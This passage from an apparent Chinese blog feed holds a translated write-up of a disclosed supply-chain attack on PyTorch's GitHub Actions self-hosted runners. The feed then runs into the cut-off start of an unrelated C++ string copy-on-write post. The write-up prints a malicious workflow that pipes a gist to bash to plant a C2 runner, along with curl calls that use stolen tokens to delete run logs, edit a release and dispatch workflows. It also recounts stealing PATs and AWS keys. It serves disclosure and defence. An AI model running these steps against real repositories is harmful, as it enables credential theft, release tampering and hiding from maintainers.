的工作流执行仅对那些尚未向仓库贡献过代码的账户要求审批。然而，存在一个选项，可以要求对所有 Fork PRs 进行工作流审批，包括之前的贡献者。我们便开始检查这项设置的状态。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_approval.png" alt="Github 工作流日志验证自托管"></p><p>在查看 PR 历史时，我们注意到，之前的贡献者提交的一些 PR 触发了 pull_request 工作流，且无需审批。这表明该仓库并不要求对之前贡献者的 Fork PRs 进行工作流审批。我们找到了关键线索。</p><p>尽管这个 Fork PR 工作流没有得到批准，但 <code>Lint / quick-checks / linux-job</code> 工作流在 pull_request 事件触发时仍然运行，这表明默认的审批设置很可能已经启用。</p><h3 id="探索潜在影响"><a href="#探索潜在影响" class="headerlink" title="探索潜在影响"></a>探索潜在影响</h3><p>在发起攻击之前，我们通常会先确认，在登陆运行环境后，我们可能能够窃取哪些 GitHub 密钥。工作流文件显示了 PyTorch 使用的一些 GitHub 密钥，包括但不限于：</p><ul><li>“aws-pytorch-uploader-secret-access-key”</li><li>“aws-access-key-id”</li><li>“GH_PYTORCHBOT_TOKEN”（GitHub 个人访问令牌）</li><li>“UPDATEBOT_TOKEN”（GitHub 个人访问令牌）</li><li>“conda-pytorchbot-token”</li></ul><p>当我们发现 <code>GH_PYTORCHBOT_TOKEN</code> 和 <code>UPDATEBOT_TOKEN</code> 时，我们异常兴奋。<strong>个人访问令牌 (PAT) 是发动供应链攻击的最有力工具之一。</strong></p><p>利用自托管运行环境窃取 GitHub 密钥并非总是可行的。我们的许多研究集中在自托管运行环境的后期利用上，即探索如何从运行环境获取到密钥的方法。PyTorch 提供了一个绝佳的机会，让我们在实际环境中测试这些技术。</p><h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2><h3 id="纠正一个拼写错误"><a href="#纠正一个拼写错误" class="headerlink" title="纠正一个拼写错误"></a>纠正一个拼写错误</h3><p>为了成为 PyTorch 仓库的贡献者并执行工作流，我们并不打算花时间去为 PyTorch 增加新功能。反而，我们发现了 markdown 文件中的一个打字错误并进行了修正。<strong>又一次给“语法警察”加分了</strong>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_grammar_police.png" alt="语法警察的又一次胜利"></p><p>没错，我又用到了我<a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">上篇文章</a>中的那个梗，但它实在太合适了。</p><h3 id="编写工作流配置"><a href="#编写工作流配置" class="headerlink" title="编写工作流配置"></a>编写工作流配置</h3><p>现在，我们需要编写一个工作流的内容，以实现在自托管运行环境中的持久化。红队成员都明白，在生产环境中实现持久化远非反向 Netcat shell 那么简单，尤其是在大型企业环境，可能会涉及到<strong>端点检测与响应</strong> (EDR)、防火墙、数据包检查等复杂因素。</p><p>我们在策划这些攻击时，思考了一个问题 — 我们能用哪种指挥和控制(C2)方式来确保能绕过 EDR，并且不会被任何防火墙阻挡？答案既明显又巧妙 — <strong>我们可以安装一个额外的自托管 GitHub 运行环境，并将其连接到我们自己的私有 GitHub 组织中。</strong></p><p>我们的 “<strong>Runner on Runner</strong>” (RoR) 技术利用与现有运行环境相同的服务器进行指挥和控制，我们部署的唯一二进制文件是已在系统上运行的官方 GitHub 运行器代理。这样一来，EDR 和防火墙保护就无效了。</p><p>我们编写了一个脚本来自动完成运行环境的注册过程，并将其作为恶意工作流有效载荷。我们把有效内容保存在 GitHub 上的一个代码片段 (gist) 中，并提交了一个恶意的草稿 PR。修改后的工作流大致如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">“🚨</span> <span class="string">pre-commit”</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">“Refactoring</span> <span class="string">and</span> <span class="string">cleanup”</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line"> <span class="attr">pull_request:</span></span><br><span class="line">   <span class="attr">branches:</span> <span class="string">main</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line"> <span class="attr">build:</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">Linux</span> <span class="string">ARM64</span></span><br><span class="line">   <span class="attr">runs-on:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.os</span> <span class="string">&#125;&#125;</span></span><br><span class="line">   <span class="attr">strategy:</span></span><br><span class="line">     <span class="attr">matrix:</span></span><br><span class="line">       <span class="attr">os:</span> [</span><br><span class="line">             &#123;<span class="attr">system:</span> <span class="string">“ARM64”</span>, <span class="attr">name:</span> <span class="string">“Linux</span> <span class="string">ARM64”</span>&#125;,</span><br><span class="line">             &#123;<span class="attr">system:</span> <span class="string">“benchmark”</span>, <span class="attr">name:</span> <span class="string">“Linux</span> <span class="string">Intel”</span>&#125;,</span><br><span class="line">             &#123;<span class="attr">system:</span> <span class="string">“glue-notify”</span>, <span class="attr">name:</span> <span class="string">“Windows</span> <span class="string">Intel”</span>&#125;</span><br><span class="line">       ]</span><br><span class="line">   <span class="attr">steps:</span></span><br><span class="line">     <span class="string">–</span> <span class="attr">name:</span> <span class="string">Lint</span> <span class="string">Code</span> <span class="string">Base</span></span><br><span class="line">       <span class="attr">continue-on-error:</span> <span class="literal">true</span></span><br><span class="line">       <span class="attr">env:</span></span><br><span class="line">          <span class="attr">VERSION:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">SYSTEM_NAME:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.os</span> <span class="string">&#125;&#125;</span></span><br><span class="line">       <span class="attr">run:</span> <span class="string">curl</span> <span class="string">&lt;GIST_URL&gt;</span> <span class="string">|</span> <span class="string">bash</span></span><br></pre></td></tr></table></figure><p>这个工作流在 PyTorch 的三个自托管运行环境上执行了 RoR gist 有效载荷，分别是名为 “ARM64” 的 Linux ARM64 机器、“benchmark” 的 Intel 设备，以及 “glue-notify” 的 Windows 系统。</p><p>通过设置为草稿状态，我们确保了仓库的维护者不会接收到任何通知。不过，鉴于 PyTorch 的 CI&#x2F;CD 环境之复杂，即便他们没有察觉这一点，我也不会感到意外。我们提交了 PR，并在每个自托管运行环境中部署了我们的 RoR C2。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_ror_c2.png" alt="成功安装 RoR C2"></p><p>我们利用 C2 仓库在标记为 “jenkins-worker-rocm-amd-34” 的运行环境上执行了 <code>pwd &amp;&amp; ls &amp;&amp; /home &amp;&amp; ip a</code> 命令，以此确认了 C2 的稳定性和远程代码的执行能力。此外，我们还运行了 sudo -l 命令，以确认我们具有 root 访问权限。</p><h2 id="后期攻击阶段"><a href="#后期攻击阶段" class="headerlink" title="后期攻击阶段"></a>后期攻击阶段</h2><p>现在我们控制了一个具有 root 权限的自托管运行环境。那又如何呢？我们曾看过关于在自托管运行环境上实现远程代码执行 (RCE) 的报告，但它们常因不明确的影响而得到模糊的回应。考虑到这些攻击的复杂性，我们想要展示对 PyTorch 的实际影响，以确保他们重视我们的发现。此外，我们还有一些新的后期攻击技术，一直想尝试一下。</p><h3 id="密钥窃取"><a href="#密钥窃取" class="headerlink" title="密钥窃取"></a>密钥窃取</h3><p>在云环境和 CI&#x2F;CD 环境中，<strong>密钥极为关键</strong>。在我们的后期攻击研究中，我们专注于攻击者能够窃取并利用的密钥信息，这些信息通常存储在自托管运行环境的配置中。大多数窃取密钥的行动都是从 GITHUB_TOKEN 开始的。</p><h3 id="神奇的-GITHUB-TOKEN"><a href="#神奇的-GITHUB-TOKEN" class="headerlink" title="神奇的 GITHUB_TOKEN"></a>神奇的 GITHUB_TOKEN</h3><p>通常，工作流需要将 GitHub 仓库检出到运行环境的文件系统中，无论是为了运行仓库中定义的测试，提交更改，还是发布新版本。工作流可以使用 GITHUB_TOKEN 来认证 GitHub 并执行这些操作。GITHUB_TOKEN 的权限范围可能从只读访问到对仓库的广泛写入权限。</p><p>PyTorch 有一些使用 actions&#x2F;checkout 步骤和具有写入权限的 GITHUB_TOKEN 的工作流。例如，通过搜索工作流日志，我们发现 periodic.yml 工作流也在 “jenkins-worker-rocm-amd-34” 这个自托管运行环境上运行。日志证实了这个工作流使用了具有广泛写入权限的 GITHUB_TOKEN。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_get_permissions.png" alt="工作流日志能看到有写权限"></p><p>虽然这个令牌仅在特定构建期间有效，但我们开发了一些技巧，在你控制运行环境后可以延长构建时间（未来将详细介绍）。考虑到 PyTorch 仓库每天运行大量工作流，我们并不担心令牌过期，因为我们总能够获取到其他令牌。</p><p>当一个工作流使用 <code>actions/checkout</code> 步骤时，GITHUB_TOKEN 会在活动工作流期间存储在自托管运行环境上已检出仓库的 .git&#x2F;config 文件中。由于我们控制了运行环境，我们只需等待一个带有特权 GITHUB_TOKEN 的非 PR 工作流在该环境上运行，然后提取 config 文件的内容。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_wait_config.png" alt="通过工作流拿到 config 文件内容"></p><p><strong>我们利用我们的 RoR C2 窃取了一个具有写入权限的正在进行的工作流的 GITHUB_TOKEN</strong>。</p><h3 id="掩盖攻击痕迹"><a href="#掩盖攻击痕迹" class="headerlink" title="掩盖攻击痕迹"></a>掩盖攻击痕迹</h3><p>我们首次使用 GITHUB_TOKEN 是为了清除我们恶意拉取请求产生的运行日志。我们想要有足够的时间进行后期攻击，同时避免因为我们的活动引发任何警报。我们利用 GitHub API 和令牌删除了我们 PR 触发的每个工作流的运行日志。如此一来，<strong>我们的行动进入了隐蔽模式</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -L \</span><br><span class="line">  -X DELETE \</span><br><span class="line">  -H “Accept: application/vnd.github+json” \</span><br><span class="line">  -H “Authorization: Bearer $STOLEN_TOKEN” \</span><br><span class="line">  -H “X-GitHub-Api-Version: 2022-11-28” \</span><br><span class="line">&lt;a href=&quot;https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/&lt;run_id&gt;</span><br></pre></td></tr></table></figure><p>如果你想尝试挑战，可以去查找与我们最初的恶意 PR 相关的工作流，你会发现那些日志已经不存在了。实际上，鉴于 PyTorch 每天运行大量工作流，达到了单个仓库几天的运行极限，他们可能根本注意不到我们的工作流。</p><h3 id="修改仓库发布"><a href="#修改仓库发布" class="headerlink" title="修改仓库发布"></a>修改仓库发布</h3><p>利用这个令牌，我们可以上传一个伪装成预编译、随时可用的 PyTorch 二进制文件，并添加说明来引导用户下载和运行这个二进制文件。任何下载了该二进制文件的用户都将执行我们的代码。如果当前的源代码资产未固定到发布提交，攻击者还可以直接覆盖这些资产。作为证明，我们使用了以下 cURL 请求来修改 PyTorch GitHub 发布的名称，我们同样可以轻松上传我们自己的资产。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -L \</span><br><span class="line">  -X PATCH \</span><br><span class="line">  -H “Accept: application/vnd.github+json” \</span><br><span class="line">  -H “Authorization: Bearer $GH_TOKEN” \</span><br><span class="line">  -H “X-GitHub-Api-Version: 2022-11-28” \</span><br><span class="line">  https://api.github.com/repos/pytorch/pytorch/releases/102257798 \</span><br><span class="line">  -d ‘&#123;“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”&#125;’</span><br></pre></td></tr></table></figure><p>作为证明，我们在当时最新的 PyTorch 发布中加入了我的名字。一个恶意攻击者可以执行类似的 API 请求，将最新的发布构件替换为他们的恶意构件。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_fake_release.png" alt="修改仓库发布"></p><h3 id="仓库秘密"><a href="#仓库秘密" class="headerlink" title="仓库秘密"></a>仓库秘密</h3><p>如果对篡改 PyTorch 仓库发布感到兴奋，那么只是我们在研究仓库秘密时所实现的影响的一部分。</p><p>PyTorch 仓库利用 GitHub 秘密使运行环境在自动发布过程中能够访问敏感系统。该仓库使用了大量秘密，包括之前讨论的多组 AWS 密钥和 GitHub 个人访问令牌 (PATs)。</p><p>特别地，weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN 和 UPDATEBOT_TOKEN 秘密来认证 GitHub。GitHub 个人访问令牌 (PATs) 经常被过度授权，成为攻击者的理想目标。这个工作流没有在自托管运行环境上运行，因此我们无法等待它运行后从文件系统中窃取这些秘密（这是我们常用的一种技术）。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_weekly.png" alt="weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN"></p><p>weekly.yml 工作流使用了两个 GitHub 个人访问令牌 (PATs) 作为秘密。这个工作流调用了 <code>_update-commit-hash</code>，该工作流指定了使用 GitHub 托管的运行环境。</p><p>虽然这个工作流不会在我们的运行环境上执行，但我们获取的 GITHUB_TOKEN 具有 actions:write 权限。我们可以利用这个令牌通过 workflow_dispatch 事件触发工作流。那么，我们能利用这个机会在 weekly.yml 工作流的上下文中运行我们的恶意代码吗？</p><p>我们有一些构想，但不确定它们是否真的可行。因此，我们决定去实际尝试一下。</p><p>结果显示，我们不能使用 GITHUB_TOKEN 直接修改工作流文件。然而，我们发现了一些<strong>创造性的……“变通方法”……可以利用 GITHUB_TOKEN 向工作流中添加恶意代码</strong>。在这种情况下，weekly.yml 调用了另一个工作流，该工作流使用了位于 .github&#x2F;workflows 目录外的脚本。<strong>我们可以在自己的分支上修改这个脚本，然后触发该分支上的工作流，从而执行我们的恶意代码</strong>。</p><p>如果这听起来有点让人困惑，别担心；这也让许多漏洞赏金项目感到困惑。我们希望能在 NV 的 LV 的某个安全会议上详细介绍这一点以及我们的其他后期攻击技术。如果我们没有那个机会，我们将在未来的博客文章中讨论我们的其他方法。</p><p>回到我们的行动。为了实施这个阶段的攻击，我们获取了另一个 GITHUB_TOKEN，并用它克隆了 PyTorch 仓库。<strong>我们创建了自己的分支，加入了我们的有效载荷，并触发了工作流</strong>。</p><p>作为隐蔽性的额外优势，我们将 git 提交中的用户名改为 pytorchmergebot，使得我们的提交和工作流看起来像是由经常与 PyTorch 仓库互动的 pytorchmergebot 用户触发的。</p><p>我们的有效载荷在 weekly.yml 工作流的上下文中运行，这个工作流使用了我们追寻的 GitHub 密钥。有效载荷加密了两个 GitHub PAT，并将它们输出到了工作流日志中。我们保护了私有加密密钥，确保只有我们能解密。</p><p>我们在 citesting1112 分支上使用以下 cURL 命令触发了 weekly.yml 工作流。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -L \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H “Accept: application/vnd.github+json” \</span><br><span class="line">  -H “Authorization: Bearer $STOLEN_TOKEN” \</span><br><span class="line">  -H “X-GitHub-Api-Version: 2022-11-28” \</span><br><span class="line">  https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches \</span><br><span class="line">  -d ‘&#123;“ref”:”citesting1112″&#125;’</span><br></pre></td></tr></table></figure><p>我们查看了 PyTorch 的 “Actions” 标签页，并在 “Weekly” 工作流的结果中发现了包含 PATs 的加密输出。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_get_pats.png" alt="weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN"></p><p>接下来，我们取消了工作流运行并清除了相关日志。</p><h3 id="PAT-访问权限"><a href="#PAT-访问权限" class="headerlink" title="PAT 访问权限"></a>PAT 访问权限</h3><p><strong>解密 GitHub PATs 后</strong>，我们利用 Gato 检查了它们的访问权限。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_pats_access.png" alt="检查 PAT 有哪些权限"></p><p>我们使用私钥解密了这些 PATs。Gato 显示，这些 PATs 可以<strong>访问 PyTorch 组织内的 93 多个仓库</strong>，包括许多私有仓库，并在其中几个仓库中拥有管理权限。这些 PATs 为供应链攻击提供了多种途径。</p><p>例如，如果攻击者不想麻烦地篡改发布，他们可能会直接向 PyTorch 的主分支添加代码。尽管主分支受到保护，但属于 pytorchbot 的 PAT 可以创建一个新的分支并添加代码，然后属于 pytorchupdatebot 的 PAT 可以批准该 PR。我们可以使用 pytorchmergebot 触发合并操作。</p><p>我们并未利用这一攻击路径向主分支添加代码，但现有的 PyTorch PR 显示，这种做法是可行的。即使攻击者不能直接推送到主分支，也有其他攻击供应链的方法。</p><p>如果威胁行为者希望更加隐蔽，他们可以将恶意代码添加到 PyTorch 在 PyTorch 组织内使用的其他私有或公共仓库中。这些仓库的曝光度较低，不太可能受到密切审查。或者，他们可以将代码偷偷加入到特性分支，窃取更多秘密，或采取其他创造性的技术来妥协 PyTorch 的供应链。</p><h3 id="AWS-访问"><a href="#AWS-访问" class="headerlink" title="AWS 访问"></a>AWS 访问</h3><p>为了证明 PAT 攻击不是一次性事件，我们决定窃取更多秘密 — 这次是 AWS 密钥。</p><p>我们采取了与上述类似的攻击方式，窃取了属于 pytorchbot AWS 用户的 aws-pytorch-uploader-secret-access-key 和 aws-access-key-id。这些 AWS 密钥有权将 PyTorch 发布上传至 AWS，为篡改 PyTorch 发布提供了另一条途径。这次攻击的影响取决于从 AWS 获取发布的来源及此 AWS 账户中的其他资产。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws.png" alt="窃取 AWS 密钥"></p><p>我们使用 AWS 命令行界面（CLI）来确认 AWS 凭证确实属于 pytorchbot AWS 用户。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws_credentials.png" alt="AWS 凭证确实属于 pytorchbot AWS 用户"></p><p>在查看“pytorch”存储桶的内容时，我们发现了许多敏感资料，包括 PyTorch 的各种发布版本。我们还发现了 PyTorch 的生产构件，并确认我们拥有对 S3 的写入权限。目前我们还不确定哪些资源会使用这些 AWS 上的发布版本。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws_contents.png" alt="pytorch 存储桶内容"></p><p>除此之外，我们还发现了其他一些 AWS 密钥、GitHub PATs 和各种凭证，这些我们原本也可以窃取。但我们认为，到此为止，我们已经充分展示了这些漏洞的潜在影响。鉴于这些漏洞的严重性，我们决定尽快提交报告，以防 PyTorch 的 3,500 名贡献者中有人决定与外国敌手勾结。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_full_attack_path.png" alt="完整的攻击路径图"></p><h2 id="提交细节"><a href="#提交细节" class="headerlink" title="提交细节"></a>提交细节</h2><p>总体来说，PyTorch 的提交流程让人感觉平淡无奇，用技术术语来说就是“blah”。他们的响应时间通常很长，而且他们的修复方案也令人质疑。</p><p>我们还了解到，这不是 PyTorch 第一次遇到自托管运行器的问题。早在 2023 年，Marcus Young 就执行了一次攻击，成功在 PyTorch 的一个运行器上获得远程代码执行（RCE）。虽然 Marcus 并未采取我们用来展示影响的后期攻击技术，但 PyTorch 在收到他的报告后，本应加强他们的运行器安全。<a href="https://marcyoung.us/post/zuckerpunch/">Marcus 的报告</a>为他赢得了 10,000 美元的赏金。</p><p>我们还不够了解 PyTorch 最新的设置，因此无法对他们保护运行器的解决方案提供意见。PyTorch 选择了实施一系列控制措施来防止滥用，而不是要求对贡献者的 fork PR 进行审批。</p><h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><p>2023年8月9日：我们向 Meta 漏洞赏金计划提交了报告。<br>2023年8月10日：Meta 将报告转交给了相关产品团队。<br>2023年9月8日：我们联系 Meta，询问更新情况。<br>2023年9月12日：Meta 回复称目前没有可提供的更新。<br>2023年10月16日：Meta 表示他们认为该问题已得到解决，如果我们认为尚未完全解决，请通知他们。<br>2023年10月16日：我们回复表示认为问题还没有得到彻底解决。<br>2023年11月1日：我们再次联系 Meta，寻求更新。<br>2023年11月21日：Meta 回复称他们已联系相关团队成员以提供更新。<br>2023年12月7日：在未收到更新之后，我们向 Meta 发送了严厉措辞的消息，表达了我们对披露流程和修复延迟的关切。<br>2023年12月7日：Meta 回应称他们认为问题已经解决，赏金发放的延迟是主要问题。<br>2023年12月7日：随后进行了数次回复，讨论了解决措施。<br>2023年12月15日：Meta 授予了 5,000 美元的赏金，并因赏金发放的延迟额外增加了 10%。<br>2023年12月15日：Meta 提供了关于他们在最初漏洞披露后采取的修复步骤的更多细节，并表示愿意安排电话会议解答我们的疑问。<br>2023年12月16日：我们选择不安排电话会议，并提出了关于赏金发放的问题（此时，我们已经对审查 PyTorch 感到疲惫）。</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>针对这类漏洞的最简单缓解方法是修改默认设置，将“首次贡献者需要审批”更改为“所有外部合作者都需要审批”。对于使用自托管运行器的任何公共仓库来说，实施这种更为严格的设置是明智之举，尽管 PyTorch 对此似乎有不同看法。</p><p>如果从 fork PRs 触发的工作流是必需的，组织应仅使用 GitHub 托管的运行器。如果确实需要自托管运行器，那么应使用隔离且短暂存在的运行器，并确保你了解其中涉及的风险。</p><p>为允许任何人在你的基础设施上运行任意代码而设计出无风险的解决方案是具有挑战性的，特别是对于像 PyTorch 这样依赖社区贡献的组织。</p><h2 id="PyTorch-是否是一个特例？"><a href="#PyTorch-是否是一个特例？" class="headerlink" title="PyTorch 是否是一个特例？"></a>PyTorch 是否是一个特例？</h2><p>这些攻击路径的问题并不是 PyTorch 特有的。它们不仅存在于机器学习仓库中，甚至不限于 GitHub。我们在全球范围内最先进的技术组织的多个 CI&#x2F;CD 平台中反复证明了通过利用 CI&#x2F;CD 漏洞来攻击供应链的弱点，这些只是更大攻击面的一小部分。</p><p>威胁行为者已经开始关注这一点，从年复一年增加的供应链攻击中可以看出。安全研究人员并非总能在恶意攻击者之前发现这些漏洞。</p><p>但在这个案例中，研究人员走在了前面。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/</a></li><li><a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/">https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/</a></li><li><a href="https://marcyoung.us/post/zuckerpunch/">https://marcyoung.us/post/zuckerpunch/</a></li><li><a href="https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/">https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/</a></li><li><a href="https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/">https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/</a></li><li><a href="https://github.com/nikitastupin/pwnhub">https://github.com/nikitastupin/pwnhub</a></li><li><a href="https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions">https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions</a></li><li><a href="https://owasp.org/www-project-top-10-ci-cd-security-risks/">https://owasp.org/www-project-top-10-ci-cd-security-risks/</a></li></ul>]]></content>
    
    
    <summary type="html">详细披露了作者如何对 PyTorch 实施高级供应链攻击的过程。他们发现了一个严重的GitHub Actions漏洞，通过提交恶意PR 获得了 PyTorch 自托管运行环境的控制权，进而窃取 GitHub 令牌与 AWS 密钥、隐藏攻击痕迹、篡改代码库与发布等。作者还讨论了这类攻击的影响、存在的风险，以及应采取的缓解措施。</summary>
    
    
    
    <category term="计算机网络" scheme="https://selfboot.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="思考" scheme="https://selfboot.cn/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>C++ string 意外修改之深入理解 COW 写时复制</title>
    <link href="https://selfboot.cn/2024/01/17/c++_string_cow/"/>
    <id>https://selfboot.cn/2024/01/17/c++_string_cow/</id>
    <published>2024-01-17T00:00:00.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>最近工作中有小伙伴遇到了一个奇怪的问题，C++中复制一个 string 后，更改复制后的内容，结果原值也被改了。对于不是很熟悉 C++ 的小伙伴来说，这就有点“见鬼”了。本文接下来从问题的简单复现，到背后的原理，以及 C++ 标准的变更，来一起深入讨论这个问题。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240115_c++_string_cow_cover.png" alt="C++字符串修改副本影响到原来内容"></p><span id="more"></span><h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><p>这里直接给出可以稳定复现的代码，定义一个字符串 original，然后复制一份，接着调用一个函数来修改副本字符串的内容。业务中的函数比较复杂，这里复现用了一个简单的函数，只是修改 copy 的第一个字符。在修改副本 copy 前后，打印两个字符串的内容和内存地址。往下看之前，你可以先猜猜下面代码的输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ModifyStringInplace</span><span class="params">(string &amp;str)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> len = str.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">char</span> *s = <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(str.<span class="built_in">c_str</span>());</span><br><span class="line">    s[<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string original = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    string copy = original;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示两个字符串的内存地址</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(original.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Copy    : &quot;</span> &lt;&lt;  copy &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(copy.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改副本</span></span><br><span class="line">    <span class="built_in">ModifyStringInplace</span>(copy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次显示两个字符串的内存地址</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;After Modification:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(original.<span class="built_in">c_str</span>()) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Copy    : &quot;</span> &lt;&lt;  copy &lt;&lt; <span class="string">&quot;, address: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">const</span> <span class="type">void</span>*&gt;(copy.<span class="built_in">c_str</span>()) &lt;&lt; 